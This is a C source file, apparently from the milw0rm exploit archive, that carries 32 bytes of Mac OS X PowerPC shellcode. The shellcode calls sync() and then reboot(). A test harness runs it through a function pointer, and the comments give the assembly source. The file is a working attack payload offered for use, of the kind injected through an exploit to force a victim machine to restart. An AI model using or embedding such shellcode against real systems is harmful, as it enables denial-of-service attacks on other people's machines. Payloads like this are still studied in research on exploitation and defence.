/*
 * [MacOSX/PowerPC]
 * Shellcode for: sync(), reboot()
 * 32 bytes
 * hophet [at] gmail.com
 * http://www.nlabs.com.br/~hophet/
 *
 */

#include <stdio.h>
#include <string.h>

char shellcode[] =

"\x7c\x63\x1a\x79"
"\x39\x40\x01\x06"
"\x38\x0a\xff\x1e"
"\x44\xff\xff\x02"
"\x60\x60\x60\x60"
"\x39\x40\x01\x19"
"\x38\x0a\xff\x1e"
"\x44\xff\xff\x02";

int main() {

	void (*p)();
	p = (void *)&shellcode;
	printf("Lenght: %d\n", strlen(shellcode));
	p();
}

/*
.globl _main
.text
_main:
	xor.	r3, r3,r3	// r3 = NULL
	li	r10, 226+36
	addi	r0, r10, -226	// r0 = 36
	.long	0x44ffff02	// sc opcode
	.long	0x60606060	// NOP
	li	r10, 226+55
	addi	r0, r10, -226	// r0 = 55
	.long	0x44ffff02	// sc opcode
*/

// milw0rm.com [2006-05-01]